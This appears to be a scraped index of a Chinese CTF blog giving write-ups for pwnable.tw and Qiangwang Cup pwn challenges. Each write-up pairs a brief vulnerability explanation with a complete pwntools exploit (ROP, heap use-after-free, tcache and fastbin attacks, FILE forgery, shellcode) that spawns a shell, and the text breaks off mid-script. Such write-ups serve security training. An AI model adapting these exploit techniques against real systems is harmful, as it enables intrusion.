","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:3:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"3×17 可以任意地址写0x18的数据，但是只能写一次，程序是静态连接并且没有开启PIE，可以很容易想到去攻击fini_array。 当程序退出时，先会执行[fini_array+8]处的代码，再执行[fini_array]。如果将fini_array=fini函数，fini_array+8=main，那么就可以不断的套娃，任意地址写。若在fini_array+16后面布置ROP，并且把fini_array=leave,ret fini_array+8=ret，那么就可以实现栈迁移进而获得shell。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote(\"chall.pwnable.tw\",\"10105\") else: sh=process(\"./3x17\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def write_data(addr,data): ru(\"addr\") sl(str(addr)) ru(\"data\") s(data) def exp(): fini=0x0000000000402960 fini_array=0x00000000004B40F0 main=0x0000000000401B6D syscall=0x0000000000472495 rax_ret=0x000000000041e4af rdi_ret=0x0000000000401696 rsi_ret=0x00000000004130be rdx_ret=0x0000000000446e35 leave=0x0000000000401c4b ret=0x0000000000401016 write_data(fini_array,p64(fini)+p64(main)+p64(rax_ret)) write_data(fini_array+0x18,p64(59)+p64(rdi_ret)+p64(fini_array+0x58)) write_data(fini_array+0x30,p64(rsi_ret)+p64(0)+p64(rdx_ret)) write_data(fini_array+0x48,p64(0)+p64(syscall)+b\"/bin/sh\\x00\") write_data(fini_array,p64(leave)+p64(ret)+p64(rax_ret)) itr() exp() ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:4:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"dubblesort 在读入数据时，没有限制数据的总数，存在栈溢出，可以布置ROP攻击链，只不过程序会对输入的数据进行一个冒泡排序。在输入名字时，由于没有初始化数据，可以泄漏栈上的垃圾数据来泄漏libc。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote(\"chall.pwnable.tw\",10101) else: sh=process(\"./dubblesort\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def exp(): libc=ELF(\"./libc_32.so.6\") #debug(\"b*0x56555A32\\nb*0x56555AF9\\nc\") sa(\":\",\"a\"*28) ru(\"a\"*28) libc_base=u32(r(4))-0x1ae244 system=libc_base+libc.symbols['system'] bin_sh=libc_base+libc.search(\"/bin/sh\\x00\").next() info_addr(\"libc_base\",libc_base) info_addr(\"system\",system) info_addr(\"bin_sh\",bin_sh) sla(\"sort :\",str(35)) for i in range(24): sla(\"number :\",str(0)) sla(\"number :\",\"+\") for i in range(7): sla(\"number :\",str(system-1)) sla(\"number :\",str(system)) sla(\"number :\",str(bin_sh-1)) sla(\"number :\",str(bin_sh)) itr() exp() ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:5:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"hacknote free后指针没有清零，存在UAF漏洞，并且堆块中有一个地址用于存放一个函数地址。因此我们可以利用UAF漏洞使得堆块重叠，再修改堆块函数地址的值，来获得shell。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote(\"chall.pwnable.tw\",10102) else: sh=process(\"./hacknote\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): ru(':') sl(str(elect)) def add(size,content): choice(1) ru(':') sl(str(size)) ru(\":\") s(content) def show(index): choice(3) ru(':') sl(str(index)) def delete(index): choice(2) ru(':') sl(str(index)) def exp(): libc=ELF(\"./libc_32.so.6\") add(0x48,'aa') #0 add(0x28,\"aa\") #1 delete(0) delete(1) add(0x8,p32(0x0804862B)) #2 show(0) __memalign_hook=u32(r(4))-48-0x20 libc_base=__memalign_hook-libc.symbols[\"__memalign_hook\"] system=libc_base+libc.symbols[\"system\"] info_addr(\"libc_base\",libc_base) delete(2) add(0x8,p32(system)+\";sh\\x00\") show(0) itr() exp() ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:6:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"SilverBullet(Fun) strncat函数会将第二个字符串的n个字符拼接到第一个字符串的末尾，并且在最后添加一个\\x00，利用这一个特性，可以将存放字符串长度的变量溢出成0，进而再次读入时可以实现栈溢出。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote('chall.pwnable.tw',10103) else: sh=process(\"./silver_bullet\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): ru('choice :') sl(str(elect)) def creat_bullut(content): choice(1) ru(':') s(content) def power_up(content): choice(2) ru(':') s(content) def beat(): choice(3) def attack(ROP): creat_bullut(\"a\"*0x2e) power_up(\"aa\") power_up(\"\\xf0\"*3+p32(0x1010101)+ROP) beat() def exp(): libc=ELF(\"./libc_32.so.6\") puts_plt=0x080484A8 puts_got=0x0804AFDC main=0x08048954 #debug(\"b*0x08048A18\\nc\") attack(p32(puts_plt)+p32(main)+p32(puts_got)) ru(\"!!\\n\") puts=u32(r(4)) libc_base=puts-libc.symbols[\"puts\"] system=libc_base+libc.symbols[\"system\"] bin_sh=libc_base+libc.search(\"/bin/sh\").next() info_addr(\"libc_base\",libc_base) attack(p32(system)+p32(main)+p32(bin_sh)) itr() exp() ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:7:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"applestore(Fun) 这道题的漏洞是出在checkout中，当购买的手机金额达到7174时，就可以购买到一个储存在栈地址上的手机，而栈上的值可以在delete函数中进行修改，这样就可以利用双向链表的接链操作来进行任意地址的修改。 这里有一个难点就是不能直接修改got表上的值，比如如果想将atoi_got修改为system，那么也会将system修改为atoi_got而system地址是只读不能写的，就会报错，因此我们只能考虑使用ROP，想要使用ROP需要先泄漏heap和stack地址，泄漏之后如何实现ROP呢？程序并不存在栈溢出，我们只能使用dword shoot攻击方法。 dword shoot攻击方法假如有两个函数A B，B执行完后，A将会立刻执行leave ret，所以可以修改B的rbp，然后利用A的leave ret来实现栈迁移，栈迁移后就是普通的ROP了。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote(\"chall.pwnable.tw\",10104) else: sh=process(\"./applestore\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): ru('\u003e ') sl(str(elect)) def add(index): choice(2) ru('\u003e ') sl(str(index)) def delete(index): choice(3) ru('\u003e ') s(index) def cart(c): choice(4) ru(\"\u003e \") s(c) def checkout(): choice(5) ru(\"\u003e \") sl(\"y\") def exp(): libc=ELF(\"./libc_32.so.6\") atoi_got=0x0804B040 #debug(\"b*0x08048C86\\nc\") for i in range(6): add(1) for i in range(20): add(2) checkout() delete(\"27\"+p32(atoi_got)+\"a\"*4+p32(0)*2) ru(\"27:\") atoi=u32(r(4)) libc_base=atoi-libc.symbols['atoi'] system=libc_base+libc.symbols['system'] bin_sh=libc_base+libc.search(\"/bin/sh\").next() info_addr(\"atoi\",atoi) info_addr(\"libc_base\",libc_base) info_addr(\"system\",system) delete(\"27\"+p32(0x0804B068+8)+\"a\"*4+p32(0)*2) ru(\"27:\") heap=u32(r(4)) info_addr(\"heap\",heap) delete(\"27\"+p32(heap+0x4a0)+\"a\"*4+p32(0)*2) ru(\"27:\") stack=u32(r(4)) info_addr(\"stack\",stack) #dword shoot delete(\"27\"+p32(heap)+p32(0)+p32(stack+0x40)+p32(stack+0x60-8)) sla(\"\u003e \",\"6\\x00\"+p32(0)+p32(system)+p32(system)+p32(bin_sh)) itr() exp() ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:8:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"Re-alloc 这道题主要考察队realloc函数的理解，当realloc的size为零时将会释放指向的堆块并返回零，size不为零时，会释放掉之前的块再重新分配一个。 利用size为0的这个特性，可以造成UAF漏洞，但是程序没有显示功能所以需要攻击IO_file来获得libc，但是这里提供一个新的思路，就是修改atoll为printf，然后就有一个格式化字符串漏洞，利用这个漏洞就可以泄漏得到libc，进而获得shell。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote(\"chall.pwnable.tw\",10106) else: sh=process(\"./re-alloc\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): ru(':') sl(str(elect)) def add(index,size,content): choice(1) ru(':') sl(str(index)) ru(':') sl(str(size)) ru(':') s(content) def re_alloc(index,size,content): choice(2) ru(':') sl(str(index)) ru(\":\") sl(str(size)) if size!=0: ru(':') sl(content) def delete(index): choice(3) ru(':') sl(str(index)) def exp(): elf=ELF(\"./re-alloc\") libc=ELF(\"./libc.so\") add(0,0x18,\"a\") re_alloc(0,0,\"\") re_alloc(0,0x18,p64(elf.got[\"atoll\"])) add(1,0x18,\"a\") re_alloc(0,0x28,\"a\") re_alloc(1,0x28,\"a\") delete(1) re_alloc(0,0x28,p64(elf.got[\"atoll\"])) add(1,0x28,\"a\") re_alloc(0,0x38,\"a\") re_alloc(1,0x38,\"a\") delete(0) re_alloc(1,0x38,p64(0)*2) delete(1) add(0,0x28,p64(elf.plt[\"printf\"])) choice(3) sla(\":\",\"%7$p\") libc_base=int(ru(\"\\n\").replace(\"\\n\",\"\"),16)-libc.symbols[\"_IO_2_1_stdout_\"] info_addr(\"libc_base\",libc_base) system=libc_base+libc.symbols['system'] #debug(\"b*0x00000000004013C9\\nc\") choice(1) sla(\"Index:\",\"A\\x00\") sla(\"Size:\",\"a\"*15) sla(\":\",p64(system)) choice(3) sla(\":\",\"/bin/sh\\x00\") itr() exp() ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:9:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"Tcache Tear 存在一个UAF漏洞，关键在于如何泄漏libc地址。程序在开头是要求输入一个name，并且还有显示name的功能，可以想到在name处构造一个fakechunk来泄漏libc。 #Author: Nopnoping from pwn import * import struct s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote(\"chall.pwnable.tw\",10207) else: sh=process(\"./tcache_tear\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): ru(':') sl(str(elect)) def add(size,content): choice(1) ru(':') sl(str(size)) ru(\":\") s(content) def delete(): choice(2) def exp(): libc=ELF(\"./libc.so\") elf=ELF(\"./tcache_tear\") name=0x0000000000602060 atoll=elf.got[\"atoll\"] printf=elf.plt[\"printf\"] #make fake chunk sla(\":\",p64(0)+p64(0x501)) #make bk chunk add(0xff,\"a\") delete() delete() add(0xff,p64(name+0x500)) add(0xff,\"\\x00\") add(0xff,p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21)) #get fake chunk point add(0x70,\"a\") delete() delete() add(0x70,p64(name+0x10)) add(0x70,\"\\x00\") add(0x70,\"\\x00\") delete() #leak choice(3) ru(\":\"+p64(0)+p64(0x501)) malloc_hook=u64(r(8))-96-0x10 libc_base=malloc_hook-libc.symbols[\"__malloc_hook\"] free_hook=libc_base+libc.symbols[\"__free_hook\"] system=libc_base+libc.symbols[\"system\"] info_addr(\"libc_base\",libc_base) info_addr(\"system\",system) info_addr(\"free_hook\",free_hook) #get shell for i in range(5): add(0xf0,\"aa\") add(0x60,\"a\") delete() delete() add(0x60,p64(free_hook)) add(0x60,p64(0)) add(0x60,p64(system)) add(0x20,\"/bin/sh\\x00\") delete() itr() exp() ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:10:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"seethefile(Fun) 这道题十分有趣，首先泄漏libc是通过打开/pro/self/maps这个文件来得到。得到libc后，在输入name时，没有限制读入name的长度，导致程序会溢出覆盖fd，因此可以伪造一个文件结构和虚函数表，来获得shell。这里由于会调用fclose函数，而fclose会调用_IO_finish_t，因此可以构造虚函数表中该函数的地址来获得shell。 #Author: Nopnoping from pwn import * from struct import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote(\"chall.pwnable.tw\",10200) else: sh=process(\"./seethefile\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def pack_file_32(_flags = \"\\x80\\x80||\", _IO_read_ptr = \"sh\\x00\\x00\", _IO_read_end = 0, _IO_read_base = 0, _IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0, _IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _IO_marker = 0, _IO_chain = 0, _fileno = 0, _lock = 0, _mode = 0): struct = _flags + \\ _IO_read_ptr+ \\ p32(_IO_read_end)+ \\ p32(_IO_read_base) + \\ p32(_IO_write_base) + \\ p32(_IO_write_ptr) + \\ p32(_IO_write_end) + \\ p32(_IO_buf_base) + \\ p32(_IO_buf_end) + \\ p32(_IO_save_base) + \\ p32(_IO_backup_base) + \\ p32(_IO_save_end) + \\ p32(_IO_marker) + \\ p32(_IO_chain) + \\ p32(_fileno) struct = struct.ljust(0x94, \"\\x00\") return struct def choice(elect): ru('choice :') sl(str(elect)) def openfile(filename): choice(1) ru(':') sl(filename) def readfile(): choice(2) def writefile(): choice(3) def closefile(): choice(4) def exp(): libc=ELF(\"./libc_32.so.6\") name=0x0804B260 #debug(\"b*0x08048B0F\\nc\") openfile(\"/proc/self/maps\") readfile() writefile() readfile() writefile() ru(\"\\n\") libc_base=int(ru(\"-\").replace(\"-\",\"\\x00\"),16) system=libc_base+libc.symbols[\"system\"] info_addr(\"libc_base\",libc_base) info_addr(\"system\",system) choice(5) fd=pack_file_32()+p32(name) payload=p32(0)*2+p32(system) payload=payload.ljust(0x20,\"\\x00\") payload+=p32(name+0x30) payload=payload.ljust(0x30,\"\\x00\") payload+=fd sla(\":\",payload) itr() exp() ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:11:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"Death Note 对于数组的下标没有严格的判断，可以为负数，存在溢出，并且没有开启NX，所以考虑写shellcode，但是读入的字符必须为可写字符，这就使得可以使用的指令大大减少。像syscall这样的指令就没办法读入了，只能通过sub等等指令，动态的修改shellcode。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote(\"chall.pwnable.tw\",10201) else: sh=process(\"./death_note\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): ru(':') sl(str(elect)) def add(index,shellcode): choice(1) ru(':') sl(str(index)) ru(\":\") sl(shellcode) def delete(index): choice(3) ru(\":\") sl(str(index)) def exp(): #debug(\"b*0x08048873\\nc\") shellcode=''' push 0x68 push 0x732f2f2f push 0x6e69622f push esp pop ebx push 0x33 pop ecx sub byte ptr [eax+0x2d],cl push 0x40 pop ecx sub byte ptr [eax+0x2e],cl sub byte ptr [eax+0x2e],cl push 0x61 pop eax sub al,0x61 push eax pop ecx push eax pop edx push 0x61 pop eax xor al,0x6a push eax pop eax ''' payload=asm(shellcode) offset=-(0x804A060-0x0804A014)/4 add(offset,payload) delete(offset) itr() exp() ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:12:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"spirited_away ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:13:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"babystack login和cpy的栈环境是一样的，可以利用在login中构造ROP，cpy中来把ROP数据粘贴过去造成溢出。 #Author: Nopnoping from pwn import * import time import struct s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() if args['REMOTE']: sh=remote(\"chall.pwnable.tw\",10205) else: sh=process(\"./babystack\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def debug(command=''): context.terminal = ['tmux', 'splitw', '-h'] gdb.attach(sh,command) def login(content=\"\\x00\"): ru(\"\u003e\u003e \") sl(\"1\") ru(\":\") s(content) def magic_copy(content): ru(\"\u003e\u003e \") sl(\"3\") ru(\":\") s(content) def leak(length): data=\"\" for i in range(length): for j in range(1,256): tmp_data=data+chr(j)+\"\\x00\" login(tmp_data) ru(\"i\") msg=ru(\"\\n\").decode().replace(\"\\n\",'\\x00') if msg==\"n Success !\": print(\"get%d\"%i) ru(\"\u003e\u003e \") sl(\"1\") data=data+chr(j) break return data def exp(): libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") #leak passwd passwd=leak(16) login(passwd+\"\\x00\"+\"a\"*0x37) #leak libc magic_copy(\"a\"*0x11) ru(\"\u003e\u003e \") sl(\"1\") file_setbuf=u64(leak(16).replace(\"a\",\"\").ljust(8,\"\\x00\"))-9 info_addr(\"file\",file_setbuf) libc_base=file_setbuf-libc.symbols[\"_IO_file_setbuf\"] onegadget=libc_base+0xf1207 info_addr(\"onegadget\",onegadget) info_addr(\"libc_base\",libc_base) #ROP a=u64(passwd[0:8]) b=u64(passwd[8:]) payload=b\"a\"*0x7+b\"\\x00\"+b\"a\"*0x38+p64(a)+p64(b)+b\"a\"*0x18+p64(onegadget) login(payload) magic_copy(b\"a\"*0x8) #get shell ru(\"\u003e\u003e\") sl(\"2\") itr() exp() ","date":"2020-10-07","objectID":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/:14:0","tags":["pwn","pwnable.tw"],"title":"pwnable.tw刷题记录(一)","uri":"/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"categories":["ctf"],"content":"蓝叶春葳蕤，桂华秋皎洁。 ","date":"2020-08-24","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/:0:0","tags":["pwn","wp"],"title":"强网杯4th-wp","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/"},{"categories":["ctf"],"content":"babymessage 在leave_message处存在栈溢出漏洞，第一次能溢出8个字节，刚好可以修改rbp，当rbp被修改后，栈上保存的值也相应的修改。如果我们将rbp修改为name处的地址，那么用于判断是否大于0x100的变量将会变成name，我们就可以溢出更多的字节，实施ROP攻击。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote('123.56.170.202',21342) libc=ELF(\"./libc-2.27.so\") else: sh=process(\"./babymessage\") libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): ru(':') sl(str(elect)) def leave_name(name): choice(1) ru(':') s(name) def leave_message(message): choice(2) ru(':') s(message) def attack(payload): leave_name(p32(0x0fffffff)) leave_message(p64(0)+p64(0x6010D0+4)) leave_message(payload) def exp(): elf=ELF(\"./babymessage\") #debug(\"b*0x0000000000400886\\nc\") puts_plt=elf.plt[\"puts\"] puts_got=elf.got[\"puts\"] rdi_ret=0x0000000000400ac3 main=0x00000000004009DD payload=p64(0)+p64(0)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main) attack(payload) ru(\"!\\n\\n\") puts_addr=u64(r(6).ljust(8,\"\\x00\")) libc_base=puts_addr-libc.symbols[\"puts\"] system=libc_base+libc.symbols[\"system\"] bin_sh=libc_base+libc.search(\"/bin/sh\").next() info_addr(\"libc_base\",libc_base) info_addr(\"system\",system) info_addr(\"bin_sh\",bin_sh) payload=p64(0)+p64(0)+p64(0x0000000000400A55)+p64(rdi_ret)+p64(bin_sh)+p64(system) attack(payload) itr() exp() ","date":"2020-08-24","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/:1:0","tags":["pwn","wp"],"title":"强网杯4th-wp","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/"},{"categories":["ctf"],"content":"babynotes 在regist函数中，利用strcpy给name分配的堆块赋值，存在堆溢出，可以修改下一个chunk的size，利用该漏洞可以实现chunk overlapping。再利用fast bin attack可以修改malloc_hook和realloc_hook获得shell。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: libc=ELF(\"./libc-2.23.so\") sh=remote(\"123.56.170.202\",43121) else: libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") sh=process(\"./babynotes\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def choice(elect): ru('\u003e\u003e ') sl(str(elect)) def add(index,size): choice(1) ru(':') sl(str(index)) ru(':') sl(str(size)) def edit(index,content): choice(4) ru(':') sl(str(index)) ru(':') sl(content) def show(index): choice(2) ru(':') sl(str(index)) def delete(index): choice(3) ru(':') sl(str(index)) def regist(name,motto,age): ru(\"name: \") s(name) ru(\"motto: \") s(motto) ru(\"age: \") sl(str(age)) def reset(name,motto,age): choice(5) regist(name,motto,age) def exp(): regist(\"criss\",\"aa\",11) add(0,0x10) add(1,0x20) add(2,0x60) # add(3,0x10) delete(0) reset(\"a\"*0x18,'a',0xa1) delete(1) add(1,0x20) show(2) ru(\"2: \") malloc_hook=u64(r(6).ljust(8,'\\x00'))-88-0x10 libc_base=malloc_hook-libc.symbols[\"__malloc_hook\"] onegadget=libc_base+0xf1207 realloc=libc_base+libc.symbols[\"realloc\"] info_addr(\"libc_base\",libc_base) info_addr(\"onegadget\",onegadget) delete(3) add(3,0x60) # delete(3) edit(2,p64(malloc_hook-0x23)) add(4,0x60) add(3,0x60) edit(3,\"\\x00\"*0xb+p64(onegadget)+p64(realloc+8)) add(0,0x10) itr() exp() ","date":"2020-08-24","objectID":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/:2:0","tags":["pwn","wp"],"title":"强网杯4th-wp","uri":"/%E5%BC%BA%E7%BD%91%E6%9D%AF3th-wp/"},{"categories":["ctf"],"content":"Siri 在remind me to这个功能里面，有一个字符串漏洞，利用该漏洞可以泄漏栈，libc地址和修改返回地址为onegadget获得shell。 #Author: Nopnoping from pwn import * s = lambda data :sh.send(data) sa = lambda delim,data :sh.sendafter(delim, data) sl = lambda data :sh.sendline(data) sla = lambda delim,data :sh.sendlineafter(delim, data) sea = lambda delim,data :sh.sendafter(delim, data) r = lambda numb=4096 :sh.recv(numb) ru = lambda delims, drop=True :sh.recvuntil(delims, drop) info_addr = lambda tag, addr :sh.info(tag +': {:#x}'.format(addr)) itr = lambda :sh.interactive() debug = lambda command='' :gdb.attach(sh,command) if args['REMOTE']: sh=remote('123.56.170.202',12124) else: sh=process(\"./Siri\") if args['I386']: context.arch='i386' else: context.arch='amd64' if args['DEBUG']: context.log_level='debug' def attack(payload): ru(\"\u003e\u003e\u003e \") sl(\"Hey Siri!\") 